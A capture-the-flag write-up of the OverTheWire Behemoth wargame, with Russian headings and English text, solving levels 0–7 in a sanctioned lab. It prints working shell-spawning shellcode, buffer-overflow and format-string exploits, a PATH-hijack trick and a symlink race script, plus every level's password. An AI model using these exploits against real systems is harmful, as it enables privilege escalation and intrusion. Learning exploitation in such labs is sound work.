---
title: "[OTW] Разбор варгейма Behemoth"
permalink: /writeups/otw/behemoth/
excerpt: "Краткий разбор варгейма Behemoth с OverTheWire."
---

---
{% include toc icon="cog" title="Behemoth Wargame" %}
The [Behemoth](http://overthewire.org/wargames/behemoth/) wargame is an online game offered by the [OverTheWire](http://overthewire.org) community. This wargame deals with a lot of regular vulnerabilities found commonly out in the wild. While the game makes no attempts at emulating a real environment it will teach you how to exploit several of the most common coding mistakes including buffer overflows, race conditions and privilege escalation.
{: .text-justify}

The challenges can be found in the **/behemoth/** folder and the passwords for each level can be found in **/etc/behemoth_pass/behemothX**. Also, unlike the **Narnia** wargame, we don't have any source for the challenges so, reverse engineering required !

Ready ?!

![image-center](/images/otw/swordfish.gif){: .align-center}

## Решение Behemoth 00

**SSH :** *ssh behemoth0@narnia.labs.overthewire.org -p 2221*<br/>
**Pass :** *behemoth0*

If we try to execute the program we get asked for a password...

```bash
behemoth0@behemoth:~$ cd /behemoth/
behemoth0@behemoth:/behemoth$ ./behemoth0
Password: blah
Access denied..
```

Out of curiosity, I tried to *ltrace* the executable :

```bash
behemoth0@behemoth:/behemoth$ ltrace ./behemoth0
__libc_start_main(0x80485b1, 1, 0xffffd764, 0x8048680 <unfinished ...>
printf("Password: ")                                                     = 10
__isoc99_scanf(0x804874c, 0xffffd66b, 0xf7fc5000, 13Password: blah
)                    = 1
strlen("OK^GSYBEX^Y")                                                    = 11
strcmp("blah", "eatmyshorts")                                            = -1
puts("Access denied.."Access denied..
)                                                  = 16
+++ exited (status 0) +++
```

**Заметка:** *ltrace* is a program that simply runs the specified command until it exits. It intercepts and records the dynamic library calls which are called by the executed process and the signals which are received by that process. It can also intercept and print the system calls executed by the program.
{: .notice--info}

The output is quite interesting as we get the password comparison : `strcmp("blah", "eatmyshorts")`. Let's try it again.

```bash
behemoth0@behemoth:/behemoth$ ./behemoth0
Password: eatmyshorts
Access granted..
$ whoami
behemoth1
$ cat /etc/behemoth_pass/behemoth1
aesebootiv
```

Success !

## Решение Behemoth 01

**SSH :** *ssh behemoth1@narnia.labs.overthewire.org -p 2221*<br/>
**Pass :** *aesebootiv*

The second level is similar to the first one :

```bash
behemoth1@behemoth:/behemoth$ ./behemoth1
Password: blah
Authentication failure.
Sorry.
```

This time the *ltrace* trick does not work. However, there is a buffer overflow.

```bash
behemoth1@behemoth:/behemoth$ (python -c "print 128 * 'A'") | ./behemoth1
Password: Authentication failure.
Sorry.
Segmentation fault
```

A little bit of analysis is required here...

```nasm
behemoth1@behemoth:/behemoth$ gdb -q ./behemoth1
Reading symbols from ./behemoth1...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x0804844b <+0>:	push   ebp
   0x0804844c <+1>:	mov    ebp,esp
   0x0804844e <+3>:	sub    esp,0x44
   0x08048451 <+6>:	push   0x8048500
   0x08048456 <+11>:	call   0x8048300 <printf@plt>
   0x0804845b <+16>:	add    esp,0x4
   0x0804845e <+19>:	lea    eax,[ebp-0x43]
   0x08048461 <+22>:	push   eax
   0x08048462 <+23>:	call   0x8048310 <gets@plt>
   0x08048467 <+28>:	add    esp,0x4
   0x0804846a <+31>:	push   0x804850c
   0x0804846f <+36>:	call   0x8048320 <puts@plt>
   0x08048474 <+41>:	add    esp,0x4
   0x08048477 <+44>:	mov    eax,0x0
   0x0804847c <+49>:	leave
   0x0804847d <+50>:	ret
End of assembler dump.
```

The line `0x0804844e <+3>: sub esp,0x44` allocate **0x44** bytes (or 68 bytes) on the stack and this space is used in the *gets()* call to store our input. Let's overwrite the **EIP**.

```nasm
(gdb) run < <(python -c 'print 71 * "A" + "BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /behemoth/behemoth1 < <(python -c 'print 71 * "A" + "BBBB"')
Password: Authentication failure.
Sorry.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Okay, now we'll place the following [shellcode](http://shell-storm.org/shellcode/files/shellcode-811.php) in an environment variable. I also added some *NOP* padding, just to be sure...

```bash
export SHELLCODE=$(python -c 'print 20 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 20 * "\x90"')
```

Let's start **GDB** and find the environment variable we just created :

```nasm
behemoth1@behemoth:/behemoth$ gdb -q behemoth1
Reading symbols from behemoth1...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break *main
Breakpoint 1 at 0x804844b
(gdb) run
Starting program: /behemoth/behemoth1

Breakpoint 1, 0x0804844b in main ()
(gdb) x/s *((char **)environ)
0xffffd826:	"LC_ALL=en_US.UTF-8"

...[removed]...

0xffffde4b:	"OLDPWD=/home/behemoth1"
(gdb)
0xffffde62:	"SHELLCODE=", '\220' <repeats 20 times>, "\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀", '\220' <repeats 20 times>
(gdb) run < <(python -c 'print 71 * "\x90" +  "\x62\xde\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /behemoth/behemoth1 < <(python -c 'print 71 * "\x90" +  "\x62\xde\xff\xff"')

Breakpoint 1, 0x0804844b in main ()
(gdb) continue
Continuing.
Password: Authentication failure.
Sorry.
process 17815 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
[Inferior 1 (process 17815) exited normally]
(gdb)
```

Now, we'll find the address of the **SHELLCODE** variable outside GDB using the following code. You can compile it in **/tmp/**.

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
```

Compile and run it :

```bash
behemoth1@behemoth:/behemoth$ cd /tmp/
behemoth1@behemoth:/tmp$ gcc -m32 find_addr.c -o find_addr
behemoth1@behemoth:/tmp$ ./find_addr SHELLCODE
SHELLCODE is at 0xffffde80
```

Finally, we can execute our exploit...

```bash
behemoth1@behemoth:/behemoth$ (python -c 'print 71 * "\x90" + "\x80\xde\xff\xff"';cat) | ./behemoth1
Password: Authentication failure.
Sorry.
whoami
behemoth2
cat /etc/behemoth_pass/behemoth2
eimahquuof
```

## Решение Behemoth 02

**SSH :** *ssh behemoth2@narnia.labs.overthewire.org -p 2221*<br/>
**Pass :** *eimahquuof*

For this one I ran *ltrace* to see how it worked :

```bash
behemoth2@behemoth:/behemoth$ ltrace ./behemoth2
__libc_start_main(0x804856b, 1, 0xffffd764, 0x8048660 <unfinished ...>
getpid()                                                                 = 17924
sprintf("touch 17924", "touch %d", 17924)                                = 11
__lxstat(3, "17924", 0xffffd630)                                         = -1
unlink("17924")                                                          = -1
geteuid()                                                                = 13002
geteuid()                                                                = 13002
setreuid(13002, 13002)                                                   = 0
system("touch 17924"touch: cannot touch '17924': Permission denied
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                   = 256
sleep(2000^C <no return ...>
--- SIGINT (Interrupt) ---
+++ killed by SIGINT +++
```

It seems that the program build a string using `touch` and its *PID* then execute it via a *system()* call. We could try to symlink `touch` to another executable like `cat` to force the program to read out our password.

```bash
behemoth2@behemoth:/tmp$ mkdir ax
behemoth2@behemoth:/tmp$ cd ax
behemoth2@behemoth:/tmp/ax$ echo "cat /etc/behemoth_pass/behemoth3" > /tmp/ax/touch
behemoth2@behemoth:/tmp/ax$ chmod 777 touch
```

Then, execute the challenge in your temporary directory :

```bash
behemoth2@behemoth:/tmp/ax$ /behemoth/behemoth2
nieteidiel
```

## Решение Behemoth 03

**SSH :** *ssh behemoth3@narnia.labs.overthewire.org -p 2221*<br/>
**Pass :** *nieteidiel*

Here, we got a simple format string vulnerability.

```bash
behemoth3@behemoth:/behemoth$ ./behemoth3
Identify yourself: %08x.%08x
Welcome, 78383025.3830252e

aaaand goodbye again.
```

Let's check the code in GDB.

```nasm
Dump of assembler code for function main:
   0x0804847b <+0>:	push   ebp
   0x0804847c <+1>:	mov    ebp,esp
   0x0804847e <+3>:	sub    esp,0xc8
   0x08048484 <+9>:	push   0x8048560
   0x08048489 <+14>:	call   0x8048330 <printf@plt>
   0x0804848e <+19>:	add    esp,0x4
   0x08048491 <+22>:	mov    eax,ds:0x80497c0
   0x08048496 <+27>:	push   eax
   0x08048497 <+28>:	push   0xc8
   0x0804849c <+33>:	lea    eax,[ebp-0xc8]
   0x080484a2 <+39>:	push   eax
   0x080484a3 <+40>:	call   0x8048340 <fgets@plt>
   0x080484a8 <+45>:	add    esp,0xc
   0x080484ab <+48>:	push   0x8048574
   0x080484b0 <+53>:	call   0x8048330 <printf@plt>
   0x080484b5 <+58>:	add    esp,0x4
   0x080484b8 <+61>:	lea    eax,[ebp-0xc8]
   0x080484be <+67>:	push   eax
   0x080484bf <+68>:	call   0x8048330 <printf@plt>
   0x080484c4 <+73>:	add    esp,0x4
   0x080484c7 <+76>:	push   0x804857e
   0x080484cc <+81>:	call   0x8048350 <puts@plt>
   0x080484d1 <+86>:	add    esp,0x4
   0x080484d4 <+89>:	mov    eax,0x0
   0x080484d9 <+94>:	leave
   0x080484da <+95>:	ret
End of assembler dump.
```

Here we could try to overwrite the call to *puts()* with an address contained in the environment variables. First we need to find the address call and export a shellcode.

```bash
behemoth3@behemoth:/behemoth$ objdump -R behemoth3

behemoth3:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049794 R_386_GLOB_DAT    __gmon_start__
080497c0 R_386_COPY        stdin@@GLIBC_2.0
080497a4 R_386_JUMP_SLOT   printf@GLIBC_2.0
080497a8 R_386_JUMP_SLOT   fgets@GLIBC_2.0
080497ac R_386_JUMP_SLOT   puts@GLIBC_2.0
080497b0 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0

behemoth3@behemoth:/behemoth$ export SHELLCODE=$(python -c 'print 20 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 20 * "\x90"')
```

The *puts()* call is at `080497ac`. Now let's find the **SHELLCODE** address.

```nasm
behemoth3@behemoth:/behemoth$ gdb -q behemoth3
Reading symbols from behemoth3...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) x/s *((char **)environ)
No symbol table is loaded.  Use the "file" command.
(gdb) break *main
Breakpoint 1 at 0x804847b
(gdb) x/s *((char **)environ)
No symbol table is loaded.  Use the "file" command.
(gdb) run
Starting program: /behemoth/behemoth3

Breakpoint 1, 0x0804847b in main ()
(gdb) x/s *((char **)environ)
0xffffd826:	"LC_ALL=en_US.UTF-8"

...[removed]...

0xffffde62:	"SHELLCODE=", '\220' <repeats 20 times>, "\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀", '\220' <repeats 20 times>
(gdb)
```

The shellcode is at `0xffffde62`. This value need to be wrote at `0x080497ac`. Let's write the PoC :

```nasm
(gdb) break *main+81
Breakpoint 1 at 0x80484cc
(gdb) run
Starting program: /behemoth/behemoth3
Identify yourself: 123
Welcome, 123

Breakpoint 1, 0x080484cc in main ()
(gdb) x/wx 0x080497ac
0x80497ac:	0x08048356

0x80497ac:	0xffffde62
(gdb) conti
Continuing.
process 18577 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
[Inferior 1 (process 18577) exited normally]
```

Looks good ! Let's do the same outside GDB :

```bash
behemoth3@behemoth:/behemoth$ /tmp/find_addr SHELLCODE
SHELLCODE is at 0xffffde75
behemoth3@behemoth:/behemoth$ (python -c 'print "\xac\x97\x04\x08\xae\x97\x04\x08%56941x%1$hn%8586x%2$hn"';cat) | ./behemoth3
whoami
behemoth4
cat /etc/behemoth_pass/behemoth4
ietheishei
```

## Решение Behemoth 04

**SSH :** *ssh behemoth4@narnia.labs.overthewire.org -p 2221*<br/>
**Pass :** *ietheishei*

Once again, I *ltrace* the code :

```bash
behemoth4@behemoth:/behemoth$ ltrace ./behemoth4
__libc_start_main(0x804857b, 1, 0xffffd764, 0x8048640 <unfinished ...>
getpid()                                                                       = 18680
sprintf("/tmp/18680", "/tmp/%d", 18680)                                        = 10
fopen("/tmp/18680", "r")                                                       = 0
puts("PID not found!"PID not found!
)                                                         = 15
+++ exited (status 0) +++
```

The code create a file with the *PID* and read it back. Of course, it the file does not exist we get an error. Here, we could pause the process right after it starts, create a symlink to the password with the **PID** as name and resume the process to get the password. If found a piece of code online to do that :

```bash
/behemoth/behemoth4&
PID=$!
kill -STOP $PID
ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID
kill -CONT $PID
echo $PID
```

Run it !

```bash
behemoth4@behemoth:/behemoth$ /tmp/test.sh
18729
behemoth4@behemoth:/behemoth$ Finished sleeping, fgetcing
aizeeshing
```

## Решение Behemoth 05

**SSH :** *ssh behemoth5@narnia.labs.overthewire.org -p 2221*<br/>
**Pass :** *aizeeshing*

First, *ltrace* the code :

```bash
behemoth5@behemoth:/behemoth$ ltrace ./behemoth5
__libc_start_main(0x804872b, 1, 0xffffd764, 0x8048920 <unfinished ...>
fopen("/etc/behemoth_pass/behemoth6", "r")                          = 0
perror("fopen"fopen: Permission denied
)                                                     = <void>
exit(1 <no return ...>
+++ exited (status 1) +++
```

Nothing much to say... It seems that the code open the file containing the password for the next level and exit on an error. If we check the code, there is a call to the *socket()* function to open an UDP socket. Then, we have a call to *atoi()* which is used to parse a string to an integral number, in our case it will be the **port** to connect to.

```nasm
behemoth5@behemoth:/behemoth$ gdb -q ./behemoth5
Reading symbols from ./behemoth5...(no debugging symbols found)...done.
(gdb) break *main
Breakpoint 1 at 0x804872b
(gdb) set disassembly-flavor intel
(gdb) run
(gdb) run
Starting program: /behemoth/behemoth5

Breakpoint 1, 0x0804872b in main ()
(gdb) disas main
Dump of assembler code for function main:
=> 0x0804872b <+0>:	lea    ecx,[esp+0x4]
   0x0804872f <+4>:	and    esp,0xfffffff0
   0x08048732 <+7>:	push   DWORD PTR [ecx-0x4]

...[removed]...

   0x0804882f <+260>:	sub    esp,0x4
   0x08048832 <+263>:	push   0x0
   0x08048834 <+265>:	push   0x2
   0x08048836 <+267>:	push   0x2
   0x08048838 <+269>:	call   0x80485f0 <socket@plt>

...[removed]...

   0x0804886c <+321>:	push   0x80489e4
   0x08048871 <+326>:	call   0x80485e0 <atoi@plt>

...[removed]...

End of assembler dump.
(gdb) x/s 0x80489e4
0x80489e4:	"1337"
(gdb)
```

We can tell its UDP due to the arguments passed to *socket()* :

- **0** = Protocol value for IP, which is 0
- **2** = SOCK_DGRAM (UDP)
- **2** = AF_INET (IPv4)

And the port seems to be **1337**. Maybe the executable send something on the port 1337. Let's open another shell and run a local UDP listener on port 1337 and run the executable.

```bash
# Shell 1
behemoth5@behemoth:/behemoth$ ./behemoth5

# Shell 2
behemoth5@behemoth:~$ nc -ulp 1337
mayiroeche
```

## Решение Behemoth 06

**SSH :** *ssh behemoth6@narnia.labs.overthewire.org -p 2221*<br/>
**Pass :** *mayiroeche*

Here we got 2 executables. One for the challenge and another to test our shellcodes.

```bash
behemoth6@behemoth:/behemoth$ ./behemoth6
Incorrect output.
behemoth6@behemoth:/behemoth$ ./behemoth6_reader
Couldn't open shellcode.txt!
```

When we *ltrace* the challenge we can get an idea of what we need to do :

```bash
behemoth6@behemoth:/behemoth$ ltrace ./behemoth6
__libc_start_main(0x80485db, 1, 0xffffd764, 0x80486d0 <unfinished ...>
popen("/behemoth/behemoth6_reader", "r")                        = 0x804b008
malloc(10)                                                      = 0x804b0b8
fread(0x804b0b8, 10, 1, 0x804b008)                              = 1
--- SIGCHLD (Child exited) ---
pclose(0x804b008)                                               = 0
strcmp("Couldn't o", "HelloKitty")                              = -1
puts("Incorrect output."Incorrect output.
)                                       = 18
+++ exited (status 0) +++
```

Basically, it takes the output of *behemoth6_reader* and compare it to the string **HelloKitty**. So, we just need to write a shellcode printing **HelloKitty**. Here it is :

```nasm
BITS 32

jmp short string

code:
	pop ecx
	xor eax, eax
	mov al, 4
	xor ebx, ebx
	inc ebx
	xor edx, edx
	mov dl, 10
	int 0x80

	mov al, 1
	dec ebx
	int 0x80

string:
	call code
	db "HelloKitty"
```

Then, assembly it, extract it and put it in a file called ***shellcode.txt* :

```bash
behemoth6@behemoth:/behemoth$ cd /tmp/
behemoth6@behemoth:/tmp$ mkdir barfoo
behemoth6@behemoth:/tmp$ cd barfoo
behemoth6@behemoth:/tmp/barfoo$ nasm HelloKitty.asm
behemoth6@behemoth:/tmp/barfoo$ ndisasm  -b32 HelloKitty
00000000  EB13              jmp short 0x15
00000002  59                pop ecx
00000003  31C0              xor eax,eax
00000005  B004              mov al,0x4
00000007  31DB              xor ebx,ebx
00000009  43                inc ebx
0000000A  31D2              xor edx,edx
0000000C  B20A              mov dl,0xa
0000000E  CD80              int 0x80
00000010  B001              mov al,0x1
00000012  4B                dec ebx
00000013  CD80              int 0x80
00000015  E8E8FFFFFF        call dword 0x2
0000001A  48                dec eax
0000001B  656C              gs insb
0000001D  6C                insb
0000001E  6F                outsd
0000001F  4B                dec ebx
00000020  69                db 0x69
00000021  7474              jz 0x97
00000023  79                db 0x79
behemoth6@behemoth:/tmp/barfoo$ (python -c "print '\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x0a\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x48\x65\x6c\x6c\x6f\x4b\x69\x74\x74\x79'") > /tmp/barfoo/shellcode.txt
behemoth6@behemoth:/tmp/barfoo$ chmod 777 shellcode.txt
```

Finally you can run `behemoth6` :

```bash
behemoth6@behemoth:/tmp/barfoo$ /behemoth/behemoth6
Correct.
$ whoami
behemoth7
$ cat /etc/behemoth_pass/behemoth7
baquoxuafo
```

## Решение Behemoth 07

**SSH :** *ssh behemoth7@narnia.labs.overthewire.org -p 2221*<br/>
**Pass :** *baquoxuafo*

Here, no output when I tried to start the executable with and without arguments. So again, *ltrace* to the rescue (with args) !

```bash
behemoth7@behemoth:/behemoth$ ltrace ./behemoth7 AAAA
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048650 <unfinished ...>
strlen("LC_ALL=en_US.UTF-8")                                 = 18
memset(0xffffd891, '\0', 18)                                 = 0xffffd891
strlen("LS_COLORS=rs=0:di=01;34:ln=01;36"...)                = 1467
memset(0xffffd8a4, '\0', 1467)                               = 0xffffd8a4
strlen("SSH_CONNECTION=173.178.59.19 608"...)                = 52
memset(0xffffde60, '\0', 52)                                 = 0xffffde60
strlen("LANG=en_US.UTF-8")                                   = 16
memset(0xffffde95, '\0', 16)                                 = 0xffffde95
strlen("USER=behemoth7")                                     = 14
memset(0xffffdea6, '\0', 14)                                 = 0xffffdea6
strlen("PWD=/behemoth")                                      = 13
memset(0xffffdeb5, '\0', 13)                                 = 0xffffdeb5
strlen("HOME=/home/behemoth7")                               = 20
memset(0xffffdec3, '\0', 20)                                 = 0xffffdec3
strlen("LC_CTYPE=en_CA.UTF-8")                               = 20
memset(0xffffded8, '\0', 20)                                 = 0xffffded8
strlen("SSH_CLIENT=173.178.59.19 60849 2"...)                = 33
memset(0xffffdeed, '\0', 33)                                 = 0xffffdeed
strlen("SSH_TTY=/dev/pts/14")                                = 19
memset(0xffffdf0f, '\0', 19)                                 = 0xffffdf0f
strlen("MAIL=/var/mail/behemoth7")                           = 24
memset(0xffffdf23, '\0', 24)                                 = 0xffffdf23
strlen("TERM=xterm-256color")                                = 19
memset(0xffffdf3c, '\0', 19)                                 = 0xffffdf3c
strlen("SHELL=/bin/bash")                                    = 15
memset(0xffffdf50, '\0', 15)                                 = 0xffffdf50
strlen("TMOUT=1800")                                         = 10
memset(0xffffdf60, '\0', 10)                                 = 0xffffdf60
strlen("SHLVL=1")                                            = 7
memset(0xffffdf6b, '\0', 7)                                  = 0xffffdf6b
strlen("LOGNAME=behemoth7")                                  = 17
memset(0xffffdf73, '\0', 17)                                 = 0xffffdf73
strlen("PATH=/usr/local/bin:/usr/bin:/bi"...)                = 61
memset(0xffffdf85, '\0', 61)                                 = 0xffffdf85
strlen("OLDPWD=/home/behemoth7")                             = 22
memset(0xffffdfc3, '\0', 22)                                 = 0xffffdfc3
strlen("_=/usr/bin/ltrace")                                  = 17
memset(0xffffdfda, '\0', 17)                                 = 0xffffdfda
__ctype_b_loc()                                              = 0xf7e106cc
__ctype_b_loc()                                              = 0xf7e106cc
__ctype_b_loc()                                              = 0xf7e106cc
__ctype_b_loc()                                              = 0xf7e106cc
strcpy(0xffffd4bc, "AAAA")                                   = 0xffffd4bc
+++ exited (status 0) +++
```

Okay, we can see that each of our environment variables are zeroed-out so, forget about placing a shellcode into an environment variable... Then, we got a call to *strcpy()* with our argument. We can try to overflow it !

```nasm
behemoth7@behemoth:/behemoth$ gdb -q ./behemoth7
Reading symbols from ./behemoth7...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) run $(python -c "print 600 * 'A'")
Starting program: /behemoth/behemoth7 $(python -c "print 600 * 'A'")

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Yay ! Now, we need to find the return address...

```nasm
(gdb) run $(python -c "print 528 * 'A' + 'BBBB'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /behemoth/behemoth7 $(python -c "print 528 * 'A' + 'BBBB'")

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Looking good ! Let's place a shellcode and try again :

```nasm
(gdb) run $(python -c "print 507 * '\x90' + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'BBBB'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /behemoth/behemoth7 $(python -c "print 507 * '\x90' + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'BBBB'")
Non-alpha chars found in string, possible shellcode!
[Inferior 1 (process 20388) exited with code 01]
```

Ooooops... So, it seems that we need to have a shellcode in alphanum. However, after some try I figured out that we could place our shellcode after the return address :

```nasm
(gdb) run $(python -c "print 528 * '\x41' + 'BBBB' + 200 * '\x90' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
Starting program: /behemoth/behemoth7 $(python -c "print 528 * '\x41' + 'BBBB' + 200 * '\x90' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/500wx $esp

...[removed]...

0xffffd6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd700:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd710:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd720:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd730:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd740:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd750:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd760:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd770:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd780:	0x41414141	0x41414141	0x41414141	0x42424141
0xffffd790:	0x90904242	0x90909090	0x90909090	0x90909090
0xffffd7a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd800:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd810:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd820:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd830:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd840:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd850:	0x90909090	0x90909090	0xc0319090	0x2f2f6850
0xffffd860:	0x2f686873	0x896e6962	0x89c189e3	0xcd0bb0c2
0xffffd870:	0x40c03180	0x000080cd	0x00000000	0x00000000
0xffffd880:	0x00000000	0x00000000	0x00000000	0x00000000
```

Now, let's choose a random address in the NOP sled like `0xffffd7e0`.

```nasm
(gdb) run $(python -c "print 528 * '\x41' + '\xe0\xd7\xff\xff' + 200 * '\x90' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /behemoth/behemoth7 $(python -c "print 528 * '\x41' + '\xe0\xd7\xff\xff' + 200 * '\x90' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
process 20467 is executing new program: /bin/dash
$
```

Awesome, let's quit GDB and try that...

```bash
behemoth7@behemoth:/behemoth$ ./behemoth7 $(python -c "print 528 * '\x41' + '\xe0\xd7\xff\xff' + 200 * '\x90' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
$ whoami
behemoth8
$ cat /etc/behemoth_pass/behemoth8
pheewij7Ae
```

Boom !
